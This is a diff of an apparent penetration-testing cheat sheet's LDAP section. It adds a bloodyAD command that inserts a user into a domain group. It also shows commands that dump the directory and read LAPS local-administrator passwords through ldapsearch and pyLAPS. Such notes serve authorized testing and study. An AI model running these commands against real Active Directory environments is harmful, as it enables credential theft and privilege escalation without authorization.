@@ -64,6 +64,7 @@ echo -e "getusername\nenumprivs\nnetshareenum\nnetsessenum\nsrvinfo\nquerydominf
 
 ### Port 389 (LDAP)
 ldapdomaindump -u $domain\\$user -p '$password' $rhost --no-json --no-grep #use domain\\user
+bloodyAD --host '$rhost' -d '$computer_name.$domain' -u '$user' -p '$password' add groupMember DEVELOPERS $user # add user to group
 Edit> ldapsearch -v -x -D $user@$domain -w $password -b "DC=$shortdomain,DC=c0mmm" -H "ldap://$rhost" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 Run via Venv> python pyLAPS.py --action get -d "$domain" -u $user -p "$password" --dc-ip $rhost
 
